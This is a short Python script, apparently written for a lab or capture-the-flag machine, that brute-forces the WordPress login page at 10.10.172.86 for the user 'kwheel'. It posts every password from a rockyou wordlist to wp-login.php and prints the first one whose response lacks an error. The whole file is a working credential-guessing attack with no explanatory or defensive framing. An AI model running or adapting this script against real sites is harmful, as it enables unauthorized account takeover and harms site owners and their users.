import requests
import sys
import signal


def exit(sig,frame):
	print('\n[!] Wait....')
	sys.exit(1)
#ctrl c
signal.signal(signal.SIGINT, exit)

#global variables
url = 'http://10.10.172.86/wp-login.php'
user = 'kwheel'
dictionary = '/home/lonewolf/SecLists-master/Passwords/Leaked-Databases/rockyou-20.txt'

def make_request():
	print('[!] Loocking for a valid password...')
	with open(dictionary, 'r') as d:
		for i in d:
			post_data = {
				'log' : user,
				'pwd' : i
			}

			r = requests.post(url, data=post_data)
			if 'ERROR' in r.text:
				continue
			else:
				print('\n[!] The password for the user is: ', post_data['pwd'])
				break


if __name__ == '__main__':
	make_request()